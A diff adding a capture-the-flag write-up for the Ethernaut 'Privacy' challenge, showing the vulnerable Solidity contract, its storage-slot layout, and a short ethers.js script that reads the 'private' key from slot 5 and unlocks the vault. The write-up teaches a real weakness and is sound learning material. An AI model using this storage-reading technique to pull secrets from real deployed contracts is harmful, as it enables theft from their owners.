@@ -270,6 +270,61 @@ With the only catch that the first time it has to return `false` to enter the `i
 
 ## 12 - Privacy
 
+In this challenge we have to unlock a vault with a secret:
+
+```solidity
+contract Privacy {
+  bool public locked = true;
+  uint256 public ID = block.timestamp;
+  uint8 private flattening = 10;
+  uint8 private denomination = 255;
+  uint16 private awkwardness = uint16(now);
+  bytes32[3] private data;
+
+  constructor(bytes32[3] memory _data) public {
+    data = _data;
+  }
+
+  function unlock(bytes16 _key) public {
+    require(_key == bytes16(data[2]));
+    locked = false;
+  }
+}
+
+```
+
+The secret is stored in `bytes32[3] private data;`, but data in smart contracts can be read, despite it being set as `private`.
+
+We first need to understand the storage slot corresponding to `data[2]`, which is the key we want.
+
+Different types occupy different space in the storage. The compiler tries to fit them in the same slot if it can, depending on its neighbours. Taking that into account, we can see that the storage is occupied this way:
+
+```typescript
+| Slot 0 | bool locked |
+| Slot 1 | uint256 ID |
+| Slot 2 | uint8 flattening + unit8 denomination + uint16 awkwardness |
+| Slot 3 | bytes32 data[0] |
+| Slot 4 | bytes32 data[1] |
+| Slot 5 | bytes32 data[2] |
+```
+
+We can see that the compiler stores multiple variables on `slot 2` because it knows they will all fit in the 32 bytes space of the slot.
+
+The one that is most important for us is `slot 5`, where our answer lies on.
+
+We can easily get it, and parse to `bytes16` to solve the challenge:
+
+```typescript
+const dataArraySlot = 5;
+const key32 = await ethers.provider.getStorageAt(contract.address, dataArraySlot);
+const key16 = key32.slice(0, 16 * 2 + 2); // 16 bytes * 2 char + 2 char (0x)
+
+const tx = await contract.unlock(key16);
+await tx.wait();
+```
+
+[Script](./scripts/12-Privacy.ts) | [Test](./test/12-Privacy.spec.ts)
+
 ## 13 - Gatekeeper One
 
 ## 14 - Gatekeeper Two
